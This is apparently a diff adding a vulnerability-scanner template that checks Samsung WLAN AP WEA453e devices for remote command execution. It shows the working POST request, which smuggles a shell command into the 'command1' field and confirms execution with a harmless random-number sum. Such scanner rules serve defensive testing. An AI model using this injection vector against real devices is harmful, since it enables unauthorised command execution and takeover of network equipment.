@@ -1,0 +1,20 @@
+id: samsung-wlan-ap-wea453e-rce
+
+info:
+    name: Samsung Wlan AP Wea453e RCE
+    author: Print1n(http://print1n.top)
+    severity: high
+
+set:
+    r1: randomInt(800000000, 1000000000)
+    r2: randomInt(800000000, 1000000000)
+    r3: randomLowercase(8)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /(download)/tmp/{{r3}}.txt
+            body: |
+                command1=shell:expr {{r1}} %2b {{r2}} | dd of=/tmp/{{r3}}.txt
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
+expression: r0()
